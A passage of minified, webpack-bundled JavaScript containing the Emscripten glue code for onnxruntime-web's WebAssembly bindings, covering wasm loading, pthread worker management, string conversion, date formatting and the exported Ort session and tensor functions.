Ca(a){if(!J&&(ka||A)){if("function"==typeof fetch&&!a.startsWith("file://"))return fetch(a,{credentials:"same-origin"}).then(b=>{if(!b.ok)throw"failed to load wasm binary file at \'"+a+"\'";return b.arrayBuffer()}).catch(()=>Ba(a));if(F)return new Promise((b,c)=>{F(a,e=>b(new Uint8Array(e)),c)})}return Promise.resolve().then(()=>Ba(a))}function Da(a,b,c){return Ca(a).then(e=>WebAssembly.instantiate(e,b)).then(e=>e).then(c,e=>{I("failed to asynchronously prepare wasm: "+e);K(e)})}\r\nfunction Ea(a,b){var c=S;return J||"function"!=typeof WebAssembly.instantiateStreaming||Aa(c)||c.startsWith("file://")||B||"function"!=typeof fetch?Da(c,a,b):fetch(c,{credentials:"same-origin"}).then(e=>WebAssembly.instantiateStreaming(e,a).then(b,function(h){I("wasm streaming compile failed: "+h);I("falling back to ArrayBuffer instantiation");return Da(c,a,b)}))}var T;function U(a){this.name="ExitStatus";this.message=`Program terminated with exit(${a})`;this.status=a}\r\nfunction Fa(a){a.terminate();a.onmessage=()=>{}}function Ga(a){(a=V.Fa[a])||K();V.fb(a)}function Ha(a){var b=V.Za();if(!b)return 6;V.Ia.push(b);V.Fa[a.Ha]=b;b.Ha=a.Ha;var c={cmd:"run",start_routine:a.gb,arg:a.Ya,pthread_ptr:a.Ha};B&&b.unref();b.postMessage(c,a.mb);return 0}\r\nvar Ia="undefined"!=typeof TextDecoder?new TextDecoder("utf8"):void 0,Ja=(a,b,c)=>{b>>>=0;var e=b+c;for(c=b;a[c]&&!(c>=e);)++c;if(16<c-b&&a.buffer&&Ia)return Ia.decode(a.buffer instanceof SharedArrayBuffer?a.slice(b,c):a.subarray(b,c));for(e="";b<c;){var h=a[b++];if(h&128){var g=a[b++]&63;if(192==(h&224))e+=String.fromCharCode((h&31)<<6|g);else{var k=a[b++]&63;h=224==(h&240)?(h&15)<<12|g<<6|k:(h&7)<<18|g<<12|k<<6|a[b++]&63;65536>h?e+=String.fromCharCode(h):(h-=65536,e+=String.fromCharCode(55296|h>>\r\n10,56320|h&1023))}}else e+=String.fromCharCode(h)}return e},Ka=(a,b)=>(a>>>=0)?Ja(n(),a,b):"";function La(a){if(D)return W(1,1,a);N=a;if(!P()){V.hb();if(w.onExit)w.onExit(a);M=!0}z(a,new U(a))}\r\nvar Na=a=>{N=a;if(D)throw Ma(a),"unwind";La(a)},V={La:[],Ia:[],Ta:[],Fa:{},Pa:function(){D?V.ab():V.$a()},$a:function(){ta.unshift(()=>{ya();V.bb(()=>za())})},ab:function(){V.receiveObjectTransfer=V.eb;V.threadInitTLS=V.Sa;V.setExitStatus=V.Ra;noExitRuntime=!1},Ra:function(a){N=a},rb:["$terminateWorker"],hb:function(){for(var a of V.Ia)Fa(a);for(a of V.La)Fa(a);V.La=[];V.Ia=[];V.Fa=[]},fb:function(a){var b=a.Ha;delete V.Fa[b];V.La.push(a);V.Ia.splice(V.Ia.indexOf(a),1);a.Ha=0;Oa(b)},eb:function(){},\r\nSa:function(){V.Ta.forEach(a=>a())},cb:a=>new Promise(b=>{a.onmessage=g=>{g=g.data;var k=g.cmd;if(g.targetThread&&g.targetThread!=X()){var t=V.Fa[g.qb];t?t.postMessage(g,g.transferList):I(\'Internal error! Worker sent a message "\'+k+\'" to target pthread \'+g.targetThread+", but that thread no longer exists!")}else if("checkMailbox"===k)Y();else if("spawnThread"===k)Ha(g);else if("cleanupThread"===k)Ga(g.thread);else if("killThread"===k)g=g.thread,k=V.Fa[g],delete V.Fa[g],Fa(k),Oa(g),V.Ia.splice(V.Ia.indexOf(k),\r\n1),k.Ha=0;else if("cancelThread"===k)V.Fa[g.thread].postMessage({cmd:"cancel"});else if("loaded"===k)a.loaded=!0,b(a);else if("alert"===k)alert("Thread "+g.threadId+": "+g.text);else if("setimmediate"===g.target)a.postMessage(g);else if("callHandler"===k)w[g.handler](...g.args);else k&&I("worker sent an unknown command "+k)};a.onerror=g=>{I("worker sent an error! "+g.filename+":"+g.lineno+": "+g.message);throw g;};B&&(a.on("message",function(g){a.onmessage({data:g})}),a.on("error",function(g){a.onerror(g)}));\r\nvar c=[],e=["onExit","onAbort","print","printErr"],h;for(h of e)w.hasOwnProperty(h)&&c.push(h);a.postMessage({cmd:"load",handlers:c,urlOrBlob:w.mainScriptUrlOrBlob||_scriptDir,wasmMemory:d,wasmModule:ra})}),bb:function(a){a()},Xa:function(){var a=la("ort-wasm-threaded.worker.js");a=new Worker(a);V.La.push(a)},Za:function(){0==V.La.length&&(V.Xa(),V.cb(V.La[0]));return V.La.pop()}};w.PThread=V;var Pa=a=>{for(;0<a.length;)a.shift()(w)};\r\nw.establishStackSpace=function(){var a=X(),b=p()[a+52>>2>>>0];a=p()[a+56>>2>>>0];Qa(b,b-a);Ra(b)};function Ma(a){if(D)return W(2,0,a);Na(a)}var Sa=[];w.invokeEntryPoint=function(a,b){var c=Sa[a];c||(a>=Sa.length&&(Sa.length=a+1),Sa[a]=c=sa.get(a));a=c(b);P()?V.Ra(a):Ta(a)};function Ua(a){this.Oa=a-24;this.Wa=function(b){r()[this.Oa+4>>2>>>0]=b};this.Va=function(b){r()[this.Oa+8>>2>>>0]=b};this.Pa=function(b,c){this.Ua();this.Wa(b);this.Va(c)};this.Ua=function(){r()[this.Oa+16>>2>>>0]=0}}\r\nvar Va=0,Wa=0;function Xa(a,b,c,e){return D?W(3,1,a,b,c,e):Ya(a,b,c,e)}function Ya(a,b,c,e){a>>>=0;b>>>=0;c>>>=0;e>>>=0;if("undefined"==typeof SharedArrayBuffer)return I("Current environment does not support SharedArrayBuffer, pthreads are not available!"),6;var h=[];if(D&&0===h.length)return Xa(a,b,c,e);a={gb:c,Ha:a,Ya:e,mb:h};return D?(a.ob="spawnThread",postMessage(a,h),0):Ha(a)}function Za(a,b,c){return D?W(4,1,a,b,c):0}function $a(a,b){if(D)return W(5,1,a,b)}\r\nvar ab=a=>{for(var b=0,c=0;c<a.length;++c){var e=a.charCodeAt(c);127>=e?b++:2047>=e?b+=2:55296<=e&&57343>=e?(b+=4,++c):b+=3}return b},bb=(a,b,c,e)=>{c>>>=0;if(!(0<e))return 0;var h=c;e=c+e-1;for(var g=0;g<a.length;++g){var k=a.charCodeAt(g);if(55296<=k&&57343>=k){var t=a.charCodeAt(++g);k=65536+((k&1023)<<10)|t&1023}if(127>=k){if(c>=e)break;b[c++>>>0]=k}else{if(2047>=k){if(c+1>=e)break;b[c++>>>0]=192|k>>6}else{if(65535>=k){if(c+2>=e)break;b[c++>>>0]=224|k>>12}else{if(c+3>=e)break;b[c++>>>0]=240|k>>\r\n18;b[c++>>>0]=128|k>>12&63}b[c++>>>0]=128|k>>6&63}b[c++>>>0]=128|k&63}}b[c>>>0]=0;return c-h},cb=(a,b,c)=>bb(a,n(),b,c);function db(a,b){if(D)return W(6,1,a,b)}function eb(a,b,c){if(D)return W(7,1,a,b,c)}function fb(a,b,c){return D?W(8,1,a,b,c):0}function gb(a,b){if(D)return W(9,1,a,b)}function hb(a,b,c){if(D)return W(10,1,a,b,c)}function ib(a,b,c,e){if(D)return W(11,1,a,b,c,e)}function jb(a,b,c,e){if(D)return W(12,1,a,b,c,e)}function kb(a,b,c,e){if(D)return W(13,1,a,b,c,e)}\r\nfunction lb(a){if(D)return W(14,1,a)}function mb(a,b){if(D)return W(15,1,a,b)}function nb(a,b,c){if(D)return W(16,1,a,b,c)}var ob=a=>{if(!M)try{if(a(),!P())try{D?Ta(N):Na(N)}catch(b){b instanceof U||"unwind"==b||z(1,b)}}catch(b){b instanceof U||"unwind"==b||z(1,b)}};function pb(a){a>>>=0;"function"===typeof Atomics.nb&&(Atomics.nb(p(),a>>2,a).value.then(Y),a+=128,Atomics.store(p(),a>>2,1))}w.__emscripten_thread_mailbox_await=pb;function Y(){var a=X();a&&(pb(a),ob(()=>qb()))}w.checkMailbox=Y;\r\nvar Z=a=>0===a%4&&(0!==a%100||0===a%400),rb=[0,31,60,91,121,152,182,213,244,274,305,335],sb=[0,31,59,90,120,151,181,212,243,273,304,334];function tb(a,b,c,e,h,g,k,t){return D?W(17,1,a,b,c,e,h,g,k,t):-52}function ub(a,b,c,e,h,g,k){if(D)return W(18,1,a,b,c,e,h,g,k)}var wb=a=>{var b=ab(a)+1,c=vb(b);c&&cb(a,c,b);return c},yb=a=>{var b=xb();a=a();Ra(b);return a};\r\nfunction W(a,b){var c=arguments.length-2,e=arguments;return yb(()=>{for(var h=zb(8*c),g=h>>3,k=0;k<c;k++){var t=e[2+k];ea()[g+k>>>0]=t}return Ab(a,c,h,b)})}\r\nvar Bb=[],Cb={},Eb=()=>{if(!Db){var a={USER:"web_user",LOGNAME:"web_user",PATH:"/",PWD:"/",HOME:"/home/web_user",LANG:("object"==typeof navigator&&navigator.languages&&navigator.languages[0]||"C").replace("-","_")+".UTF-8",_:ja||"./this.program"},b;for(b in Cb)void 0===Cb[b]?delete a[b]:a[b]=Cb[b];var c=[];for(b in a)c.push(`${b}=${a[b]}`);Db=c}return Db},Db;\r\nfunction Fb(a,b){if(D)return W(19,1,a,b);a>>>=0;b>>>=0;var c=0;Eb().forEach(function(e,h){var g=b+c;h=r()[a+4*h>>2>>>0]=g;for(g=0;g<e.length;++g)aa()[h++>>0>>>0]=e.charCodeAt(g);aa()[h>>0>>>0]=0;c+=e.length+1});return 0}function Gb(a,b){if(D)return W(20,1,a,b);a>>>=0;b>>>=0;var c=Eb();r()[a>>2>>>0]=c.length;var e=0;c.forEach(function(h){e+=h.length+1});r()[b>>2>>>0]=e;return 0}function Hb(a){return D?W(21,1,a):52}function Ib(a,b,c,e){return D?W(22,1,a,b,c,e):52}\r\nfunction Mb(a,b,c,e,h){return D?W(23,1,a,b,c,e,h):70}var Nb=[null,[],[]];function Ob(a,b,c,e){if(D)return W(24,1,a,b,c,e);b>>>=0;c>>>=0;e>>>=0;for(var h=0,g=0;g<c;g++){var k=r()[b>>2>>>0],t=r()[b+4>>2>>>0];b+=8;for(var C=0;C<t;C++){var v=n()[k+C>>>0],y=Nb[a];0===v||10===v?((1===a?qa:I)(Ja(y,0)),y.length=0):y.push(v)}h+=t}r()[e>>2>>>0]=h;return 0}\r\nvar Pb=()=>{if("object"==typeof crypto&&"function"==typeof crypto.getRandomValues)return c=>(c.set(crypto.getRandomValues(new Uint8Array(c.byteLength))),c);if(B)try{var a=__webpack_require__(/*! crypto */ "?892d");if(a.randomFillSync)return c=>a.randomFillSync(c);var b=a.randomBytes;return c=>(c.set(b(c.byteLength)),c)}catch(c){}K("initRandomDevice")},Qb=a=>(Qb=Pb())(a),Rb=[31,29,31,30,31,30,31,31,30,31,30,31],Sb=[31,28,31,30,31,30,31,31,30,31,30,31];function Tb(a){var b=Array(ab(a)+1);bb(a,b,0,b.length);return b}\r\nvar Ub=(a,b)=>{aa().set(a,b>>>0)};\r\nfunction Vb(a,b,c,e){function h(f,q,u){for(f="number"==typeof f?f.toString():f||"";f.length<q;)f=u[0]+f;return f}function g(f,q){return h(f,q,"0")}function k(f,q){function u(Jb){return 0>Jb?-1:0<Jb?1:0}var G;0===(G=u(f.getFullYear()-q.getFullYear()))&&0===(G=u(f.getMonth()-q.getMonth()))&&(G=u(f.getDate()-q.getDate()));return G}function t(f){switch(f.getDay()){case 0:return new Date(f.getFullYear()-1,11,29);case 1:return f;case 2:return new Date(f.getFullYear(),0,3);case 3:return new Date(f.getFullYear(),\r\n0,2);case 4:return new Date(f.getFullYear(),0,1);case 5:return new Date(f.getFullYear()-1,11,31);case 6:return new Date(f.getFullYear()-1,11,30)}}function C(f){var q=f.Ja;for(f=new Date((new Date(f.Ka+1900,0,1)).getTime());0<q;){var u=f.getMonth(),G=(Z(f.getFullYear())?Rb:Sb)[u];if(q>G-f.getDate())q-=G-f.getDate()+1,f.setDate(1),11>u?f.setMonth(u+1):(f.setMonth(0),f.setFullYear(f.getFullYear()+1));else{f.setDate(f.getDate()+q);break}}u=new Date(f.getFullYear()+1,0,4);q=t(new Date(f.getFullYear(),\r\n0,4));u=t(u);return 0>=k(q,f)?0>=k(u,f)?f.getFullYear()+1:f.getFullYear():f.getFullYear()-1}a>>>=0;b>>>=0;c>>>=0;e>>>=0;var v=p()[e+40>>2>>>0];e={kb:p()[e>>2>>>0],jb:p()[e+4>>2>>>0],Ma:p()[e+8>>2>>>0],Qa:p()[e+12>>2>>>0],Na:p()[e+16>>2>>>0],Ka:p()[e+20>>2>>>0],Ga:p()[e+24>>2>>>0],Ja:p()[e+28>>2>>>0],sb:p()[e+32>>2>>>0],ib:p()[e+36>>2>>>0],lb:v?Ka(v):""};c=Ka(c);v={"%c":"%a %b %d %H:%M:%S %Y","%D":"%m/%d/%y","%F":"%Y-%m-%d","%h":"%b","%r":"%I:%M:%S %p","%R":"%H:%M","%T":"%H:%M:%S","%x":"%m/%d/%y",\r\n"%X":"%H:%M:%S","%Ec":"%c","%EC":"%C","%Ex":"%m/%d/%y","%EX":"%H:%M:%S","%Ey":"%y","%EY":"%Y","%Od":"%d","%Oe":"%e","%OH":"%H","%OI":"%I","%Om":"%m","%OM":"%M","%OS":"%S","%Ou":"%u","%OU":"%U","%OV":"%V","%Ow":"%w","%OW":"%W","%Oy":"%y"};for(var y in v)c=c.replace(new RegExp(y,"g"),v[y]);var Kb="Sunday Monday Tuesday Wednesday Thursday Friday Saturday".split(" "),Lb="January February March April May June July August September October November December".split(" ");v={"%a":f=>Kb[f.Ga].substring(0,3),\r\n"%A":f=>Kb[f.Ga],"%b":f=>Lb[f.Na].substring(0,3),"%B":f=>Lb[f.Na],"%C":f=>g((f.Ka+1900)/100|0,2),"%d":f=>g(f.Qa,2),"%e":f=>h(f.Qa,2," "),"%g":f=>C(f).toString().substring(2),"%G":f=>C(f),"%H":f=>g(f.Ma,2),"%I":f=>{f=f.Ma;0==f?f=12:12<f&&(f-=12);return g(f,2)},"%j":f=>{for(var q=0,u=0;u<=f.Na-1;q+=(Z(f.Ka+1900)?Rb:Sb)[u++]);return g(f.Qa+q,3)},"%m":f=>g(f.Na+1,2),"%M":f=>g(f.jb,2),"%n":()=>"\\n","%p":f=>0<=f.Ma&&12>f.Ma?"AM":"PM","%S":f=>g(f.kb,2),"%t":()=>"\\t","%u":f=>f.Ga||7,"%U":f=>g(Math.floor((f.Ja+\r\n7-f.Ga)/7),2),"%V":f=>{var q=Math.floor((f.Ja+7-(f.Ga+6)%7)/7);2>=(f.Ga+371-f.Ja-2)%7&&q++;if(q)53==q&&(u=(f.Ga+371-f.Ja)%7,4==u||3==u&&Z(f.Ka)||(q=1));else{q=52;var u=(f.Ga+7-f.Ja-1)%7;(4==u||5==u&&Z(f.Ka%400-1))&&q++}return g(q,2)},"%w":f=>f.Ga,"%W":f=>g(Math.floor((f.Ja+7-(f.Ga+6)%7)/7),2),"%y":f=>(f.Ka+1900).toString().substring(2),"%Y":f=>f.Ka+1900,"%z":f=>{f=f.ib;var q=0<=f;f=Math.abs(f)/60;return(q?"+":"-")+String("0000"+(f/60*100+f%60)).slice(-4)},"%Z":f=>f.lb,"%%":()=>"%"};c=c.replace(/%%/g,\r\n"\\x00\\x00");for(y in v)c.includes(y)&&(c=c.replace(new RegExp(y,"g"),v[y](e)));c=c.replace(/\\0\\0/g,"%");y=Tb(c);if(y.length>b)return 0;Ub(y,a);return y.length-1}V.Pa();\r\nvar Wb=[null,La,Ma,Xa,Za,$a,db,eb,fb,gb,hb,ib,jb,kb,lb,mb,nb,tb,ub,Fb,Gb,Hb,Ib,Mb,Ob],Zb={b:function(a,b,c){a>>>=0;(new Ua(a)).Pa(b>>>0,c>>>0);Va=a;Wa++;throw Va;},N:function(a){Xb(a>>>0,!A,1,!ka,131072,!1);V.Sa()},k:function(a){a>>>=0;D?postMessage({cmd:"cleanupThread",thread:a}):Ga(a)},I:Ya,h:Za,T:$a,E:db,G:eb,U:fb,R:gb,J:hb,Q:ib,o:jb,F:kb,C:lb,S:mb,D:nb,q:()=>!0,A:function(a,b){a>>>=0;a==b>>>0?setTimeout(()=>Y()):D?postMessage({targetThread:a,cmd:"checkMailbox"}):(a=V.Fa[a])&&a.postMessage({cmd:"checkMailbox"})},\r\nL:function(){return-1},M:pb,p:function(a){B&&V.Fa[a>>>0].ref()},t:function(a,b,c){a=b+2097152>>>0<4194305-!!a?(a>>>0)+4294967296*b:NaN;c>>>=0;a=new Date(1E3*a);p()[c>>2>>>0]=a.getUTCSeconds();p()[c+4>>2>>>0]=a.getUTCMinutes();p()[c+8>>2>>>0]=a.getUTCHours();p()[c+12>>2>>>0]=a.getUTCDate();p()[c+16>>2>>>0]=a.getUTCMonth();p()[c+20>>2>>>0]=a.getUTCFullYear()-1900;p()[c+24>>2>>>0]=a.getUTCDay();a=(a.getTime()-Date.UTC(a.getUTCFullYear(),0,1,0,0,0,0))/864E5|0;p()[c+28>>2>>>0]=a},u:function(a,b,c){a=b+\r\n2097152>>>0<4194305-!!a?(a>>>0)+4294967296*b:NaN;c>>>=0;a=new Date(1E3*a);p()[c>>2>>>0]=a.getSeconds();p()[c+4>>2>>>0]=a.getMinutes();p()[c+8>>2>>>0]=a.getHours();p()[c+12>>2>>>0]=a.getDate();p()[c+16>>2>>>0]=a.getMonth();p()[c+20>>2>>>0]=a.getFullYear()-1900;p()[c+24>>2>>>0]=a.getDay();b=(Z(a.getFullYear())?rb:sb)[a.getMonth()]+a.getDate()-1|0;p()[c+28>>2>>>0]=b;p()[c+36>>2>>>0]=-(60*a.getTimezoneOffset());b=(new Date(a.getFullYear(),6,1)).getTimezoneOffset();var e=(new Date(a.getFullYear(),0,1)).getTimezoneOffset();\r\na=(b!=e&&a.getTimezoneOffset()==Math.min(e,b))|0;p()[c+32>>2>>>0]=a},v:function(a){a>>>=0;var b=new Date(p()[a+20>>2>>>0]+1900,p()[a+16>>2>>>0],p()[a+12>>2>>>0],p()[a+8>>2>>>0],p()[a+4>>2>>>0],p()[a>>2>>>0],0),c=p()[a+32>>2>>>0],e=b.getTimezoneOffset(),h=(new Date(b.getFullYear(),6,1)).getTimezoneOffset(),g=(new Date(b.getFullYear(),0,1)).getTimezoneOffset(),k=Math.min(g,h);0>c?p()[a+32>>2>>>0]=Number(h!=g&&k==e):0<c!=(k==e)&&(h=Math.max(g,h),b.setTime(b.getTime()+6E4*((0<c?k:h)-e)));p()[a+24>>2>>>\r\n0]=b.getDay();c=(Z(b.getFullYear())?rb:sb)[b.getMonth()]+b.getDate()-1|0;p()[a+28>>2>>>0]=c;p()[a>>2>>>0]=b.getSeconds();p()[a+4>>2>>>0]=b.getMinutes();p()[a+8>>2>>>0]=b.getHours();p()[a+12>>2>>>0]=b.getDate();p()[a+16>>2>>>0]=b.getMonth();p()[a+20>>2>>>0]=b.getYear();a=b.getTime()/1E3;return Yb((T=a,1<=+Math.abs(T)?0<T?+Math.floor(T/4294967296)>>>0:~~+Math.ceil((T-+(~~T>>>0))/4294967296)>>>0:0)),a>>>0},r:tb,s:ub,z:function(a,b,c){function e(v){return(v=v.toTimeString().match(/\\(([A-Za-z ]+)\\)$/))?\r\nv[1]:"GMT"}a>>>=0;b>>>=0;c>>>=0;var h=(new Date).getFullYear(),g=new Date(h,0,1),k=new Date(h,6,1);h=g.getTimezoneOffset();var t=k.getTimezoneOffset(),C=Math.max(h,t);r()[a>>2>>>0]=60*C;p()[b>>2>>>0]=Number(h!=t);a=e(g);b=e(k);a=wb(a);b=wb(b);t<h?(r()[c>>2>>>0]=a,r()[c+4>>2>>>0]=b):(r()[c>>2>>>0]=b,r()[c+4>>2>>>0]=a)},c:()=>{K("")},l:function(){},i:function(){return Date.now()},V:()=>{wa+=1;throw"unwind";},B:function(){return 4294901760},e:()=>performance.timeOrigin+performance.now(),f:function(){return B?\r\n(__webpack_require__(/*! os */ "?aedb").cpus)().length:navigator.hardwareConcurrency},K:function(a,b,c,e){V.pb=b>>>0;Bb.length=c;b=e>>>0>>3;for(e=0;e<c;e++)Bb[e]=ea()[b+e>>>0];return Wb[a].apply(null,Bb)},y:function(a){a>>>=0;var b=n().length;if(a<=b||4294901760<a)return!1;for(var c=1;4>=c;c*=2){var e=b*(1+.2/c);e=Math.min(e,a+100663296);var h=Math;e=Math.max(a,e);a:{h=h.min.call(h,4294901760,e+(65536-e%65536)%65536)-d.buffer.byteLength+65535>>>16;try{d.grow(h);m();var g=1;break a}catch(k){}g=void 0}if(g)return!0}return!1},\r\nO:Fb,P:Gb,j:Na,g:Hb,n:Ib,w:Mb,m:Ob,x:function(a,b){a>>>=0;b>>>=0;Qb(n().subarray(a>>>0,a+b>>>0));return 0},a:d||w.wasmMemory,H:Vb,d:function(a,b,c,e){return Vb(a>>>0,b>>>0,c>>>0,e>>>0)}};(function(){function a(c,e){c=c.exports;L=c=$b(c);V.Ta.push(L.sa);sa=L.ta;ua.unshift(L.W);ra=e;za();return c}var b={a:Zb};ya();if(w.instantiateWasm)try{return w.instantiateWasm(b,a)}catch(c){I("Module.instantiateWasm callback failed with error: "+c),x(c)}Ea(b,function(c){a(c.instance,c.module)}).catch(x);return{}})();\r\nw._OrtInit=(a,b)=>(w._OrtInit=L.X)(a,b);w._OrtGetLastError=(a,b)=>(w._OrtGetLastError=L.Y)(a,b);w._OrtCreateSessionOptions=(a,b,c,e,h,g,k,t,C,v)=>(w._OrtCreateSessionOptions=L.Z)(a,b,c,e,h,g,k,t,C,v);w._OrtAppendExecutionProvider=(a,b)=>(w._OrtAppendExecutionProvider=L._)(a,b);w._OrtAddSessionConfigEntry=(a,b,c)=>(w._OrtAddSessionConfigEntry=L.$)(a,b,c);w._OrtReleaseSessionOptions=a=>(w._OrtReleaseSessionOptions=L.aa)(a);w._OrtCreateSession=(a,b,c)=>(w._OrtCreateSession=L.ba)(a,b,c);\r\nw._OrtReleaseSession=a=>(w._OrtReleaseSession=L.ca)(a);w._OrtGetInputOutputCount=(a,b,c)=>(w._OrtGetInputOutputCount=L.da)(a,b,c);w._OrtGetInputName=(a,b)=>(w._OrtGetInputName=L.ea)(a,b);w._OrtGetOutputName=(a,b)=>(w._OrtGetOutputName=L.fa)(a,b);w._OrtFree=a=>(w._OrtFree=L.ga)(a);w._OrtCreateTensor=(a,b,c,e,h)=>(w._OrtCreateTensor=L.ha)(a,b,c,e,h);w._OrtGetTensorData=(a,b,c,e,h)=>(w._OrtGetTensorData=L.ia)(a,b,c,e,h);w._OrtReleaseTensor=a=>(w._OrtReleaseTensor=L.ja)(a);\r\nw._OrtCreateRunOptions=(a,b,c,e)=>(w._OrtCreateRunOptions=L.ka)(a,b,c,e);w._OrtAddRunConfigEntry=(a,b,c)=>(w._OrtAddRunConfigEntry=L.la)(a,b,c);w._OrtReleaseRunOptions=a=>(w._OrtReleaseRunOptions=L.ma)(a);w._OrtRun=(a,b,c,e,h,g,k,t)=>(w._OrtRun=L.na)(a,b,c,e,h,g,k,t);w._OrtEndProfiling=a=>(w._OrtEndProfiling=L.oa)(a);var X=w._pthread_self=()=>(X=w._pthread_self=L.pa)(),vb=w._malloc=a=>(vb=w._malloc=L.qa)(a);w._free=a=>(w._free=L.ra)(a);w.__emscripten_tls_init=()=>(w.__emscripten_tls_init=L.sa)();\r\nvar Xb=w.__emscripten_thread_init=(a,b,c,e,h,g)=>(Xb=w.__emscripten_thread_init=L.ua)(a,b,c,e,h,g);w.__emscripten_thread_crashed=()=>(w.__emscripten_thread_crashed=L.va)();var Ab=(a,b,c,e)=>(Ab=L.wa)(a,b,c,e),Oa=a=>(Oa=L.xa)(a),Ta=w.__emscripten_thread_exit=a=>(Ta=w.__emscripten_thread_exit=L.ya)(a),qb=w.__emscripten_check_mailbox=()=>(qb=w.__emscripten_check_mailbox=L.za)(),Yb=a=>(Yb=L.Aa)(a),Qa=(a,b)=>(Qa=L.Ba)(a,b),xb=()=>(xb=L.Ca)(),Ra=a=>(Ra=L.Da)(a),zb=a=>(zb=L.Ea)(a);\r\nfunction $b(a){a=Object.assign({},a);var b=e=>()=>e()>>>0,c=e=>h=>e(h)>>>0;a.__errno_location=b(a.__errno_location);a.pthread_self=b(a.pthread_self);a.malloc=c(a.malloc);a.stackSave=b(a.stackSave);a.stackAlloc=c(a.stackAlloc);return a}w.keepRuntimeAlive=P;w.wasmMemory=d;w.stackAlloc=zb;w.stackSave=xb;w.stackRestore=Ra;w.UTF8ToString=Ka;w.stringToUTF8=cb;w.lengthBytesUTF8=ab;w.ExitStatus=U;w.PThread=V;var ac;R=function bc(){ac||cc();ac||(R=bc)};\r\nfunction cc(){function a(){if(!ac&&(ac=!0,w.calledRun=!0,!M)){D||Pa(ua);ha(w);if(w.onRuntimeInitialized)w.onRuntimeInitialized();if(!D){if(w.postRun)for("function"==typeof w.postRun&&(w.postRun=[w.postRun]);w.postRun.length;){var b=w.postRun.shift();va.unshift(b)}Pa(va)}}}if(!(0<Q))if(D)ha(w),D||Pa(ua),startWorker(w);else{if(w.preRun)for("function"==typeof w.preRun&&(w.preRun=[w.preRun]);w.preRun.length;)ta.unshift(w.preRun.shift());Pa(ta);0<Q||(w.setStatus?(w.setStatus("Running..."),setTimeout(function(){setTimeout(function(){w.setStatus("")},\r\n1);a()},1)):a())}}if(w.preInit)for("function"==typeof w.preInit&&(w.preInit=[w.preInit]);0<w.preInit.length;)w.preInit.pop()();cc();\r\n\r\n\r\n  return moduleArg.ready\r\n}\r\n\r\n);\r\n})();\r\nif (true)\r\n  module.exports = ortWasmThreaded;\r\nelse {}\r\n\n\n/***/ }),\n\n/***/ "./lib/wasm/binding/ort-wasm.js":\n/*!**************************************!*\\\n  !*** ./lib/wasm/binding/ort-wasm.js ***!\n  \\**************************************/\n/***/ ((module, __unused_webpack_exports, __webpack_require__) => {\n\n\r\nvar ortWasm = (() => {\r\n  var _scriptDir = typeof document !== \'undefined\' && document.currentScript ? document.currentScript.src : undefined;\r\n  if (typeof __filename !== \'undefined\') _scriptDir = _scriptDir || __filename;\r\n  return (\r\nfunction(moduleArg = {}) {\r\n\r\nvar e=moduleArg,aa,h;e.ready=new Promise((a,b)=>{aa=a;h=b});var ba=Object.assign({},e),m="./this.program",q=(a,b)=>{throw b;},ca="object"==typeof window,v="function"==typeof importScripts,x="object"==typeof process&&"object"==typeof process.versions&&"string"==typeof process.versions.node,y="",A,B,C;\r\nif(x){var fs=__webpack_require__(/*! fs */ "?63c8"),D=__webpack_require__(/*! path */ "?75c6");y=v?D.dirname(y)+"/":__dirname+"/";A=(a,b)=>{a=a.startsWith("file://")?new URL(a):D.normalize(a);return fs.readFileSync(a,b?void 0:"utf8")};C=a=>{a=A(a,!0);a.buffer||(a=new Uint8Array(a));return a};B=(a,b,c,f=!0)=>{a=a.startsWith("file://")?new URL(a):D.normalize(a);fs.readFile(a,f?void 0:"utf8",(g,k)=>{g?c(g):b(f?k.buffer:k)})};!e.thisProgram&&1<process.argv.length&&(m=process.argv[1].replace(/\\\\/g,"/"));process.argv.slice(2);q=(a,b)=>{process.exitCode=\r\na;throw b;};e.inspect=()=>"[Emscripten Module object]"}else if(ca||v)v?y=self.location.href:"undefined"!=typeof document&&document.currentScript&&(y=document.currentScript.src),_scriptDir&&(y=_scriptDir),0!==y.indexOf("blob:")?y=y.substr(0,y.replace(/[?#].*/,"").lastIndexOf("/")+1):y="",A=a=>{var b=new XMLHttpRequest;b.open("GET",a,!1);b.send(null);return b.responseText},v&&(C=a=>{var b=new XMLHttpRequest;b.open("GET",a,!1);b.responseType="arraybuffer";b.send(null);return new Uint8Array(b.response)}),\r\nB=(a,b,c)=>{var f=new XMLHttpRequest;f.open("GET",a,!0);f.responseType="arraybuffer";f.onload=()=>{200==f.status||0==f.status&&f.response?b(f.response):c()};f.onerror=c;f.send(null)};var da=e.print||console.log.bind(console),E=e.printErr||console.error.bind(console);Object.assign(e,ba);ba=null;e.thisProgram&&(m=e.thisProgram);e.quit&&(q=e.quit);var F;e.wasmBinary&&(F=e.wasmBinary);var noExitRuntime=e.noExitRuntime||!0;"object"!=typeof WebAssembly&&G("no native wasm support detected");\r\nvar H,I,J=!1,K,L,M,N;function ea(){var a=H.buffer;e.HEAP8=K=new Int8Array(a);e.HEAP16=new Int16Array(a);e.HEAP32=M=new Int32Array(a);e.HEAPU8=L=new Uint8Array(a);e.HEAPU16=new Uint16Array(a);e.HEAPU32=N=new Uint32Array(a);e.HEAPF32=new Float32Array(a);e.HEAPF64=new Float64Array(a)}var fa=[],ha=[],ia=[];function ja(){var a=e.preRun.shift();fa.unshift(a)}var O=0,P=null,Q=null;\r\nfunction G(a){if(e.onAbort)e.onAbort(a);a="Aborted("+a+")";E(a);J=!0;a=new WebAssembly.RuntimeError(a+". Build with -sASSERTIONS for more info.");h(a);throw a;}function ka(a){return a.startsWith("data:application/octet-stream;base64,")}var R;R="ort-wasm.wasm";if(!ka(R)){var la=R;R=e.locateFile?e.locateFile(la,y):y+la}function ma(a){if(a==R&&F)return new Uint8Array(F);if(C)return C(a);throw"both async and sync fetching of the wasm failed";}\r\nfunction na(a){if(!F&&(ca||v)){if("function"==typeof fetch&&!a.startsWith("file://"))return fetch(a,{credentials:"same-origin"}).then(b=>{if(!b.ok)throw"failed to load wasm binary file at \'"+a+"\'";return b.arrayBuffer()}).catch(()=>ma(a));if(B)return new Promise((b,c)=>{B(a,f=>b(new Uint8Array(f)),c)})}return Promise.resolve().then(()=>ma(a))}function oa(a,b,c){return na(a).then(f=>WebAssembly.instantiate(f,b)).then(f=>f).then(c,f=>{E("failed to asynchronously prepare wasm: "+f);G(f)})}\r\nfunction pa(a,b){var c=R;return F||"function"!=typeof WebAssembly.instantiateStreaming||ka(c)||c.startsWith("file://")||x||"function"!=typeof fetch?oa(c,a,b):fetch(c,{credentials:"same-origin"}).then(f=>WebAssembly.instantiateStreaming(f,a).then(b,function(g){E("wasm streaming compile failed: 